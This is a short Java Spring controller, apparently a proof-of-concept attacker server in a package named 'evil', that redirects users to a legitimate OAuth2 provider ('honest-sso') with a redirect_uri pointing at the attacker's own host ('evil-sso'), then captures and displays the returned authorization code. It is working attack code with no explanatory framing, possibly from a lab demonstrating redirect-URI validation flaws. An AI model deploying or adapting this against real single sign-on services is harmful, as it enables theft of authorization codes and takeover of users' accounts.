package com.example.evil;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;

@Controller
public class HomeController {
	@GetMapping("/")
	public String index() {
		return "hello";
	}

	@GetMapping("/oauth2/authorize")
	public String authorize() {
		return "redirect:http://honest-sso:9000/oauth2/authorize?response_type=code&client_id=honest-client&scope=message.read+message.write&state=12345678&redirect_uri=http://evil-sso:8090/.honest-client";
	}

	@GetMapping("/.honest-client")
	public String authorize(Model model,  @RequestParam String code) {
		model.addAttribute("code", code);
		return "authorized";
	}
}
